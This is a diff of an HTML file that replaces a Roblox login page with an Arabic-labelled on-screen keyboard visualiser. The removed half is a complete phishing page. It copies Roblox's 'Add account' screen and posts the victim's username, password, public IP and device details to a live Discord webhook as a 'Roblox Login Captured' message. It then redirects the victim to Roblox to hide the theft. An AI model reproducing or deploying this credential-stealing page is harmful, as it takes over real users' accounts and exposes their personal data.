@@ -1,486 +1,388 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Add Account</title>
-
-<style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:Arial,Helvetica,sans-serif;
-}
-
-body{
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-
-    background:url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg') center center/cover no-repeat;
-}
-
-body::before{
-    content:"";
-    position:fixed;
-    inset:0;
-    background:rgba(0,0,0,.58);
-    z-index:0;
-}
-
-/* ========================= */
-/* TOP BAR */
-/* ========================= */
-
-.topbar{
-    position:fixed;
-    top:0;
-    left:0;
-    right:0;
-
-    height:36px;
-
-    background:#181a22;
-
-    border-bottom:1px solid rgba(255,255,255,.06);
-
-    display:flex;
-    align-items:center;
-
-    z-index:999;
-}
-
-.logo{
-    width:22px;
-    height:22px;
-
-    margin-left:16px;
-    margin-right:38px;
-
-    background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1NiIgaGVpZ2h0PSI1NiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDU2IDU2Ij48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMTEuNjc2IDAgMCA0NC4xNjYgNDMuNTc3IDU2bDExLjY3Ni00NC4xNjZ6bTIwLjQwOSAzNS44MjctMTIuMTc3LTMuMzA4IDMuMjY0LTEyLjM0MiAxMi4xODIgMy4zMDh6Ii8+PC9zdmc+");
-
-    background-repeat:no-repeat;
-    background-position:center;
-    background-size:contain;
-}
-
-.nav{
-    display:flex;
-    align-items:center;
-    gap:52px;
-}
-
-.nav a{
-    color:#ffffff;
-    text-decoration:none;
-    font-size:13px;
-    font-weight:500;
-}
-
-.search{
-    position:absolute;
-    left:50%;
-    transform:translateX(-50%);
-}
-
-.search input{
-    width:420px;
-    height:26px;
-
-    background:#232633;
-
-    border:1px solid rgba(255,255,255,.25);
-    border-radius:8px;
-
-    color:white;
-    font-size:13px;
-
-    padding:0 12px;
-
-    outline:none;
-}
-
-.search input::placeholder{
-    color:#c6c8d0;
-}
-
-.signup-btn{
-    margin-left:auto;
-    margin-right:12px;
-
-    background:#335fff;
-
-    color:white;
-    text-decoration:none;
-
-    padding:5px 14px;
-
-    border-radius:8px;
-
-    font-size:13px;
-    font-weight:700;
-}
-
-/* ========================= */
-/* LOGIN BOX */
-/* ========================= */
-
-.login-container{
-    position:relative;
-    z-index:1;
-
-    width:362px;
-
-    background:#23252d;
-
-    padding:24px 16px 22px;
-}
-
-.title{
-    text-align:center;
-
-    color:white;
-
-    font-size:28px;
-    font-weight:800;
-
-    margin-bottom:18px;
-}
-
-.input{
-    width:100%;
-    height:40px;
-
-    background:#343744;
-
-    border:1px solid #4b5061;
-    border-radius:8px;
-
-    color:white;
-
-    padding:0 12px;
-
-    margin-bottom:10px;
-
-    outline:none;
-}
-
-.input::placeholder{
-    color:#ececec;
-}
-
-.login-btn{
-    width:100%;
-    height:40px;
-
-    background:transparent;
-
-    border:1px solid #d8d8d8;
-    border-radius:8px;
-
-    color:white;
-
-    cursor:pointer;
-
-    transition:background .2s;
-}
-
-.login-btn:hover{
-    background:rgba(255,255,255,.08);
-}
-
-.login-btn:disabled{
-    opacity:.5;
-    cursor:not-allowed;
-}
-
-.forgot{
-    text-align:center;
-
-    margin-top:18px;
-    margin-bottom:22px;
-}
-
-.forgot a{
-    color:white;
-    text-decoration:none;
-
-    font-size:14px;
-    font-weight:700;
-}
-
-.forgot a:hover{
-    text-decoration:underline;
-}
-
-.separator{
-    height:1px;
-    background:#3d4150;
-
-    margin-bottom:20px;
-}
-
-.alt-btn{
-    width:100%;
-    height:34px;
-
-    background:#3b4050;
-
-    border:none;
-    border-radius:8px;
-
-    color:white;
-
-    font-size:14px;
-    font-weight:600;
-
-    margin-bottom:8px;
-
-    cursor:pointer;
-}
-
-.signup-text{
-    text-align:center;
-
-    margin-top:24px;
-
-    color:white;
-    font-size:15px;
-    font-weight:600;
-}
-
-.signup-text a{
-    color:white;
-    text-decoration:none;
-}
-
-.signup-text a:hover{
-    text-decoration:underline;
-}
-
-#statusMsg{
-    text-align:center;
-    margin-top:12px;
-    font-size:13px;
-    color:#aab;
-    min-height:20px;
-    transition:color .3s;
-}
-#statusMsg.success{ color:#4ade80; }
-#statusMsg.error{ color:#f87171; }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, maximum-scale=2.0">
+  <title>كيبورد واقعي - 60% بدون أسهم</title>
+  <style>
+    :root {
+      --key-unit: 38px;
+      --key-gap: 3px;
+      --key-height: 38px;
+      --body-bg: #1a1a1c;
+      --key-bg-top: #3d3d42;
+      --key-bg-bottom: #2c2c30;
+      --key-border: #111113;
+      --key-text: #d4d4d8;
+      --key-sub-text: #8b8b90;
+      --key-shadow-dark: #0d0d0f;
+      --key-pressed-glow: rgba(120, 180, 255, 0.8);
+      --body-padding: 16px;
+      --body-radius: 14px;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: #0a0a0c;
+      font-family: 'Segoe UI', 'SF Pro Display', 'Helvetica Neue', Arial, sans-serif;
+      user-select: none;
+      -webkit-user-select: none;
+      -webkit-tap-highlight-color: transparent;
+      padding: 10px;
+      direction: ltr;
+    }
+
+    .keyboard-wrapper {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow-x: auto;
+      padding: 10px 0;
+      -webkit-overflow-scrolling: touch;
+    }
+
+    .keyboard-body {
+      background: linear-gradient(180deg, #1e1e22 0%, #161619 30%, #131316 100%);
+      border-radius: var(--body-radius);
+      padding: var(--body-padding);
+      box-shadow: 0 8px 32px rgba(0,0,0,0.7), 0 2px 6px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.03), inset 0 -2px 6px rgba(0,0,0,0.4);
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      border: 1px solid #222226;
+      max-width: 100%;
+    }
+
+    .led-row {
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      gap: 10px;
+      padding: 2px 6px 4px 0;
+      margin-bottom: 2px;
+    }
+
+    .led-group {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .led-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #2a2a2e;
+      box-shadow: inset 0 1px 2px rgba(0,0,0,0.6);
+      transition: all 0.2s ease;
+    }
+
+    .led-dot.active {
+      background: #4ade80;
+      box-shadow: 0 0 8px #4ade80, 0 0 16px rgba(74,222,128,0.5), inset 0 0 2px #fff;
+    }
+
+    .led-label {
+      font-size: 7px;
+      color: #555;
+      letter-spacing: 0.3px;
+      text-transform: uppercase;
+    }
+
+    .main-keyboard {
+      display: flex;
+      flex-direction: column;
+      gap: var(--key-gap);
+    }
+
+    .key-row {
+      display: flex;
+      gap: var(--key-gap);
+      justify-content: flex-start;
+    }
+
+    .key {
+      height: var(--key-height);
+      background: linear-gradient(180deg, #4a4a50 0%, #3a3a40 40%, #2e2e34 100%);
+      border: 1.5px solid #1a1a1e;
+      border-radius: 6px;
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: var(--key-text);
+      font-size: 12px;
+      font-weight: 600;
+      letter-spacing: 0.3px;
+      box-shadow: 0 1.5px 0 #55555c inset, 0 -0.5px 0 #1f1f23 inset, 0 3.5px 0 #1a1a1e, 0 4px 8px rgba(0,0,0,0.5);
+      transition: all 0.08s ease-out;
+      position: relative;
+      min-width: var(--key-unit);
+      text-align: center;
+      line-height: 1.1;
+      z-index: 1;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .key:hover {
+      background: linear-gradient(180deg, #52525a 0%, #42424a 40%, #35353c 100%);
+      box-shadow: 0 1.5px 0 #5d5d66 inset, 0 -0.5px 0 #25252a inset, 0 3.5px 0 #1a1a1e, 0 5px 10px rgba(0,0,0,0.6);
+    }
+
+    .key:active, .key.pressed {
+      transform: translateY(2.5px);
+      background: linear-gradient(180deg, #35353c 0%, #2a2a30 40%, #222228 100%);
+      box-shadow: 0 0.5px 0 #4a4a52 inset, 0 -0.5px 0 #1a1a1e inset, 0 1px 0 #15151a, 0 1px 2px rgba(0,0,0,0.5), 0 0 14px var(--key-pressed-glow), 0 0 28px rgba(120,180,255,0.25);
+      color: #e8e8f0;
+      border-color: #2a2a35;
+      z-index: 5;
+    }
+
+    .key .key-primary {
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 1;
+    }
+    .key .key-secondary {
+      font-size: 9px;
+      font-weight: 400;
+      color: #9999a0;
+      line-height: 1;
+      margin-top: 1px;
+    }
+
+    .key-w1 { width: var(--key-unit); min-width: var(--key-unit); }
+    .key-w1-25 { width: calc(var(--key-unit)*1.25 + var(--key-gap)*0.25); min-width: calc(var(--key-unit)*1.25 + var(--key-gap)*0.25); }
+    .key-w1-5 { width: calc(var(--key-unit)*1.5 + var(--key-gap)*0.5); min-width: calc(var(--key-unit)*1.5 + var(--key-gap)*0.5); }
+    .key-w1-75 { width: calc(var(--key-unit)*1.75 + var(--key-gap)*0.75); min-width: calc(var(--key-unit)*1.75 + var(--key-gap)*0.75); }
+    .key-w2 { width: calc(var(--key-unit)*2 + var(--key-gap)); min-width: calc(var(--key-unit)*2 + var(--key-gap)); }
+    .key-w2-25 { width: calc(var(--key-unit)*2.25 + var(--key-gap)*1.25); min-width: calc(var(--key-unit)*2.25 + var(--key-gap)*1.25); }
+    .key-w2-75 { width: calc(var(--key-unit)*2.75 + var(--key-gap)*1.75); min-width: calc(var(--key-unit)*2.75 + var(--key-gap)*1.75); }
+    .key-w6-25 { width: calc(var(--key-unit)*6.25 + var(--key-gap)*5.25); min-width: calc(var(--key-unit)*6.25 + var(--key-gap)*5.25); }
+
+    .key-mod {
+      font-size: 10px;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+      color: #b0b0b8;
+    }
+
+    @media (max-width: 700px) {
+      :root {
+        --key-unit: 28px;
+        --key-height: 28px;
+        --key-gap: 2px;
+        --body-padding: 10px;
+        --body-radius: 10px;
+      }
+      .key { font-size: 10px; border-radius: 4px; }
+      .key .key-primary { font-size: 11px; }
+      .key .key-secondary { font-size: 7px; margin-top: 0; }
+      .key-mod { font-size: 8px; letter-spacing: 0; }
+      .led-dot { width: 4px; height: 4px; }
+      .led-label { font-size: 6px; }
+    }
+    @media (max-width: 480px) {
+      :root {
+        --key-unit: 22px;
+        --key-height: 22px;
+        --key-gap: 1.5px;
+        --body-padding: 6px;
+      }
+      .key { font-size: 8px; }
+      .key .key-primary { font-size: 9px; }
+      .key .key-secondary { font-size: 5px; }
+      .key-mod { font-size: 6px; }
+    }
+  </style>
 </head>
 <body>
-
-<nav class="topbar">
-
-    <div class="logo"></div>
-
-    <div class="nav">
-        <a href="#">Charts</a>
-        <a href="#">Marketplace</a>
-        <a href="#">Create</a>
-        <a href="#">Robux</a>
+<div class="keyboard-wrapper">
+  <div class="keyboard-body" id="keyboardBody">
+    <!-- مؤشرات LED -->
+    <div class="led-row">
+      <div class="led-group"><div class="led-dot" id="ledCaps"></div><span class="led-label">Caps</span></div>
+      <div class="led-group"><div class="led-dot" id="ledNum"></div><span class="led-label">Num</span></div>
+      <div class="led-group"><div class="led-dot" id="ledScroll"></div><span class="led-label">Scrl</span></div>
     </div>
 
-    <div class="search">
-        <input type="text" placeholder="Search">
+    <!-- الكيبورد 60% بدون أسهم -->
+    <div class="main-keyboard">
+      <!-- الصف الأول: أرقام ورموز -->
+      <div class="key-row">
+        <button class="key key-w1 key-mod" data-code="Escape">Esc</button>
+        <button class="key key-w1" data-code="Digit1"><span class="key-secondary">!</span><span class="key-primary">1</span></button>
+        <button class="key key-w1" data-code="Digit2"><span class="key-secondary">@</span><span class="key-primary">2</span></button>
+        <button class="key key-w1" data-code="Digit3"><span class="key-secondary">#</span><span class="key-primary">3</span></button>
+        <button class="key key-w1" data-code="Digit4"><span class="key-secondary">$</span><span class="key-primary">4</span></button>
+        <button class="key key-w1" data-code="Digit5"><span class="key-secondary">%</span><span class="key-primary">5</span></button>
+        <button class="key key-w1" data-code="Digit6"><span class="key-secondary">^</span><span class="key-primary">6</span></button>
+        <button class="key key-w1" data-code="Digit7"><span class="key-secondary">&amp;</span><span class="key-primary">7</span></button>
+        <button class="key key-w1" data-code="Digit8"><span class="key-secondary">*</span><span class="key-primary">8</span></button>
+        <button class="key key-w1" data-code="Digit9"><span class="key-secondary">(</span><span class="key-primary">9</span></button>
+        <button class="key key-w1" data-code="Digit0"><span class="key-secondary">)</span><span class="key-primary">0</span></button>
+        <button class="key key-w1" data-code="Minus"><span class="key-secondary">_</span><span class="key-primary">-</span></button>
+        <button class="key key-w1" data-code="Equal"><span class="key-secondary">+</span><span class="key-primary">=</span></button>
+        <button class="key key-w2 key-mod" data-code="Backspace">⌫</button>
+      </div>
+
+      <!-- الصف الثاني: QWERTY -->
+      <div class="key-row">
+        <button class="key key-w1-5 key-mod" data-code="Tab">Tab</button>
+        <button class="key key-w1" data-code="KeyQ"><span class="key-primary">Q</span></button>
+        <button class="key key-w1" data-code="KeyW"><span class="key-primary">W</span></button>
+        <button class="key key-w1" data-code="KeyE"><span class="key-primary">E</span></button>
+        <button class="key key-w1" data-code="KeyR"><span class="key-primary">R</span></button>
+        <button class="key key-w1" data-code="KeyT"><span class="key-primary">T</span></button>
+        <button class="key key-w1" data-code="KeyY"><span class="key-primary">Y</span></button>
+        <button class="key key-w1" data-code="KeyU"><span class="key-primary">U</span></button>
+        <button class="key key-w1" data-code="KeyI"><span class="key-primary">I</span></button>
+        <button class="key key-w1" data-code="KeyO"><span class="key-primary">O</span></button>
+        <button class="key key-w1" data-code="KeyP"><span class="key-primary">P</span></button>
+        <button class="key key-w1" data-code="BracketLeft"><span class="key-secondary">{</span><span class="key-primary">[</span></button>
+        <button class="key key-w1" data-code="BracketRight"><span class="key-secondary">}</span><span class="key-primary">]</span></button>
+        <button class="key key-w1-5" data-code="Backslash"><span class="key-secondary">|</span><span class="key-primary">\</span></button>
+      </div>
+
+      <!-- الصف الثالث: ASDF + Enter -->
+      <div class="key-row">
+        <button class="key key-w1-75 key-mod" data-code="CapsLock">Caps</button>
+        <button class="key key-w1" data-code="KeyA"><span class="key-primary">A</span></button>
+        <button class="key key-w1" data-code="KeyS"><span class="key-primary">S</span></button>
+        <button class="key key-w1" data-code="KeyD"><span class="key-primary">D</span></button>
+        <button class="key key-w1" data-code="KeyF"><span class="key-primary">F</span></button>
+        <button class="key key-w1" data-code="KeyG"><span class="key-primary">G</span></button>
+        <button class="key key-w1" data-code="KeyH"><span class="key-primary">H</span></button>
+        <button class="key key-w1" data-code="KeyJ"><span class="key-primary">J</span></button>
+        <button class="key key-w1" data-code="KeyK"><span class="key-primary">K</span></button>
+        <button class="key key-w1" data-code="KeyL"><span class="key-primary">L</span></button>
+        <button class="key key-w1" data-code="Semicolon"><span class="key-secondary">:</span><span class="key-primary">;</span></button>
+        <button class="key key-w1" data-code="Quote"><span class="key-secondary">"</span><span class="key-primary">'</span></button>
+        <button class="key key-w2-25 key-mod" data-code="Enter">Enter</button>
+      </div>
+
+      <!-- الصف الرابع: Shift + ZXCVBNM + Shift (بدون سهم لأعلى) -->
+      <div class="key-row">
+        <button class="key key-w2-25 key-mod" data-code="ShiftLeft">Shift</button>
+        <button class="key key-w1" data-code="KeyZ"><span class="key-primary">Z</span></button>
+        <button class="key key-w1" data-code="KeyX"><span class="key-primary">X</span></button>
+        <button class="key key-w1" data-code="KeyC"><span class="key-primary">C</span></button>
+        <button class="key key-w1" data-code="KeyV"><span class="key-primary">V</span></button>
+        <button class="key key-w1" data-code="KeyB"><span class="key-primary">B</span></button>
+        <button class="key key-w1" data-code="KeyN"><span class="key-primary">N</span></button>
+        <button class="key key-w1" data-code="KeyM"><span class="key-primary">M</span></button>
+        <button class="key key-w1" data-code="Comma"><span class="key-secondary">&lt;</span><span class="key-primary">,</span></button>
+        <button class="key key-w1" data-code="Period"><span class="key-secondary">&gt;</span><span class="key-primary">.</span></button>
+        <button class="key key-w1" data-code="Slash"><span class="key-secondary">?</span><span class="key-primary">/</span></button>
+        <button class="key key-w1-75 key-mod" data-code="ShiftRight">Shift</button>
+        <!-- تم حذف سهم الأعلى من هنا -->
+      </div>
+
+      <!-- الصف السفلي: المفاتيح الخاصة + مسافة (بدون أسهم) -->
+      <div class="key-row">
+        <button class="key key-w1-25 key-mod" data-code="ControlLeft">Ctrl</button>
+        <button class="key key-w1-25 key-mod" data-code="MetaLeft">Win</button>
+        <button class="key key-w1-25 key-mod" data-code="AltLeft">Alt</button>
+        <button class="key key-w6-25" data-code="Space" style="font-size:0;">&nbsp;</button>
+        <button class="key key-w1-25 key-mod" data-code="AltRight">Alt</button>
+        <button class="key key-w1-25 key-mod" data-code="MetaRight">Win</button>
+        <button class="key key-w1-25 key-mod" data-code="ContextMenu">≣</button>
+        <button class="key key-w1-25 key-mod" data-code="ControlRight">Ctrl</button>
+        <!-- تم حذف الأسهم (يسار - أسفل - يمين) من هنا -->
+      </div>
     </div>
-
-    <a class="signup-btn"
-       href="https://www.roblox.com/CreateAccount"
-       target="_blank">
-       Sign Up
-    </a>
-
-</nav>
-
-<div class="login-container">
-
-    <div class="title">
-        Add account
-    </div>
-
-    <input
-        type="text"
-        class="input"
-        id="usernameInput"
-        placeholder="Username/Email/Phone"
-    >
-
-    <input
-        type="password"
-        class="input"
-        id="passwordInput"
-        placeholder="Password"
-    >
-
-    <button class="login-btn" id="loginBtn">
-        Log In
-    </button>
-
-    <div id="statusMsg"></div>
-
-    <div class="forgot">
-        <a href="https://www.roblox.com/login/forgot-password-or-username"
-           target="_blank">
-            Forgot Password or Username?
-        </a>
-    </div>
-
-    <div class="separator"></div>
-
-    <button class="alt-btn" onclick="alert('One-time code sent (simulated)')">
-        Email Me a One-Time Code
-    </button>
-
-    <button class="alt-btn" onclick="alert('Quick sign-in (simulated)')">
-        Quick Sign-in
-    </button>
-
-    <div class="signup-text">
-        Don't have an account?
-        <a href="https://www.roblox.com/CreateAccount"
-           target="_blank">
-           Sign Up
-        </a>
-    </div>
-
+  </div>
 </div>
 
 <script>
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510744005980459072/Wo0tVKL36lpZttZ5Yl8HGT8LQH1Ixmkl2xcsdnipXOmoICtsPtCPKdA2iwkVvn_q1qRA';
+  (function() {
+    const keyboardBody = document.getElementById('keyboardBody');
+    const ledCaps = document.getElementById('ledCaps');
+    const ledNum = document.getElementById('ledNum');
+    const ledScroll = document.getElementById('ledScroll');
 
-    const usernameEl = document.getElementById('usernameInput');
-    const passwordEl = document.getElementById('passwordInput');
-    const loginBtn   = document.getElementById('loginBtn');
-    const statusMsg  = document.getElementById('statusMsg');
+    let capsLockOn = false;
+    let numLockOn = true;
+    let scrollLockOn = false;
 
-    let cachedIP = null;
-
-    function setStatus(text, type){
-        statusMsg.textContent = text;
-        statusMsg.className = type || '';
+    function updateLEDs() {
+      if (capsLockOn) ledCaps.classList.add('active'); else ledCaps.classList.remove('active');
+      if (numLockOn) ledNum.classList.add('active'); else ledNum.classList.remove('active');
+      if (scrollLockOn) ledScroll.classList.add('active'); else ledScroll.classList.remove('active');
     }
+    updateLEDs();
 
-    function validate(){
-        if(!usernameEl.value.trim()){
-            setStatus('Please enter a username/email/phone', 'error');
-            return false;
-        }
-        if(!passwordEl.value.trim()){
-            setStatus('Please enter your password', 'error');
-            return false;
-        }
-        return true;
-    }
-
-    function getDeviceInfo(){
-        const ua = navigator.userAgent;
-        let os = 'Unknown';
-        let device = 'Desktop';
-        let browser = 'Unknown';
-
-        if(/Windows NT 10/.test(ua)) os = 'Windows 10';
-        else if(/Windows NT 11/.test(ua)) os = 'Windows 11';
-        else if(/Mac OS X/.test(ua)) os = 'macOS';
-        else if(/Linux/.test(ua) && !/Android/.test(ua)) os = 'Linux';
-        else if(/Android/.test(ua)) os = 'Android';
-        else if(/iPhone|iPad|iPod/.test(ua)) os = 'iOS';
-
-        if(/iPhone/.test(ua)) device = 'iPhone';
-        else if(/iPad/.test(ua)) device = 'iPad';
-        else if(/Android/.test(ua) && /Mobile/.test(ua)) device = 'Android Phone';
-        else if(/Android/.test(ua)) device = 'Android Tablet';
-
-        if(/Edg/.test(ua)) browser = 'Edge';
-        else if(/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
-        else if(/Firefox/.test(ua)) browser = 'Firefox';
-        else if(/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
-        else if(/Opera|OPR/.test(ua)) browser = 'Opera';
-
-        const lang = navigator.language || navigator.userLanguage || 'Unknown';
-
-        return { os, device, browser, lang, ua };
-    }
-
-    // Pre-fetch IP immediately when page loads (in background)
-    fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(d => { cachedIP = d.ip; })
-        .catch(() => { cachedIP = 'Unavailable'; });
-
-    loginBtn.addEventListener('click', async function(){
-
-        if(!validate()) return;
-
-        loginBtn.disabled = true;
-        loginBtn.textContent = 'Please wait...';
-        setStatus('Processing...', '');
-
-        const username = usernameEl.value.trim();
-        const password = passwordEl.value.trim();
-        const devInfo = getDeviceInfo();
-
-        // Use cached IP (already fetched on page load) or try live
-        let ip = cachedIP;
-        if(!ip){
-            try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
-                ip = d.ip;
-            } catch(e){
-                ip = 'Unavailable';
-            }
-        }
-
-        const payload = {
-            content: `**🎮 Roblox Login Captured**`,
-            embeds: [{
-                title: 'Account Credentials',
-                color: 0x335fff,
-                fields: [
-                    { name: '👤 Username / Email / Phone', value: username, inline: true },
-                    { name: '🔑 Password', value: `||${password}||`, inline: true },
-                    { name: '\u200B', value: '\u200B', inline: false },
-                    { name: '💻 System', value: devInfo.os, inline: true },
-                    { name: '📱 Device', value: devInfo.device, inline: true },
-                    { name: '🌐 Browser', value: devInfo.browser, inline: true },
-                    { name: '🌍 Language', value: devInfo.lang, inline: true },
-                    { name: '🌐 Public IP', value: ip, inline: true },
-                    { name: '🕐 Time', value: new Date().toLocaleString('en-US'), inline: true }
-                ],
-                footer: { text: 'Roblox Security Test' },
-                timestamp: new Date().toISOString()
-            }]
-        };
-
-        try {
-            const res = await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-
-            if(res.ok){
-                setStatus('✅ Done!', 'success');
-                setTimeout(() => {
-                    window.location.href = 'https://www.roblox.com/home';
-                }, 1200);
-            } else {
-                setStatus('❌ Failed', 'error');
-                loginBtn.disabled = false;
-                loginBtn.textContent = 'Log In';
-            }
-        } catch(err){
-            setStatus('❌ Error', 'error');
-            loginBtn.disabled = false;
-            loginBtn.textContent = 'Log In';
-        }
+    const allKeys = keyboardBody.querySelectorAll('.key[data-code]');
+    const keyMap = new Map();
+    allKeys.forEach(keyEl => {
+      const code = keyEl.getAttribute('data-code');
+      if (code && !keyMap.has(code)) keyMap.set(code, []);
+      if (code) keyMap.get(code).push(keyEl);
     });
-</script>
 
+    function pressKey(code) { (keyMap.get(code) || []).forEach(k => k.classList.add('pressed')); }
+    function releaseKey(code) { (keyMap.get(code) || []).forEach(k => k.classList.remove('pressed')); }
+    function releaseAll() { allKeys.forEach(k => k.classList.remove('pressed')); }
+
+    document.addEventListener('keydown', function(e) {
+      const code = e.code;
+      capsLockOn = e.getModifierState('CapsLock');
+      numLockOn = e.getModifierState('NumLock');
+      scrollLockOn = e.getModifierState('ScrollLock');
+      updateLEDs();
+
+      pressKey(code);
+
+      const preventKeys = ['F1','F3','F5','F11','F12','Tab','ContextMenu','MetaLeft','MetaRight'];
+      if (preventKeys.includes(code) || (code.startsWith('F') && !isNaN(code.slice(1))) || (code === 'Backspace' && e.target === document.body)) {
+        e.preventDefault();
+      }
+      if (e.ctrlKey && ['KeyW','KeyT','KeyN','KeyR','KeyS','KeyP','KeyD','KeyF','KeyH'].includes(code)) {
+        e.preventDefault();
+      }
+    });
+
+    document.addEventListener('keyup', function(e) {
+      releaseKey(e.code);
+      capsLockOn = e.getModifierState('CapsLock');
+      numLockOn = e.getModifierState('NumLock');
+      scrollLockOn = e.getModifierState('ScrollLock');
+      updateLEDs();
+    });
+
+    window.addEventListener('blur', releaseAll);
+    document.addEventListener('visibilitychange', () => { if (document.hidden) releaseAll(); });
+
+    // تفاعل الفأرة واللمس
+    allKeys.forEach(keyEl => {
+      keyEl.addEventListener('mousedown', function(e) {
+        e.preventDefault();
+        this.classList.add('pressed');
+        if (navigator.vibrate) navigator.vibrate(5);
+      });
+      keyEl.addEventListener('mouseup', function() { this.classList.remove('pressed'); });
+      keyEl.addEventListener('mouseleave', function() { this.classList.remove('pressed'); });
+      keyEl.addEventListener('touchstart', function(e) {
+        e.preventDefault();
+        this.classList.add('pressed');
+        if (navigator.vibrate) navigator.vibrate(5);
+      });
+      keyEl.addEventListener('touchend', function() { this.classList.remove('pressed'); });
+      keyEl.addEventListener('touchcancel', function() { this.classList.remove('pressed'); });
+    });
+
+    console.log('⌨️ كيبورد 60% واقعي – بدون أسهم – متصل بالكيبورد الحقيقي');
+  })();
+</script>
 </body>
 </html>
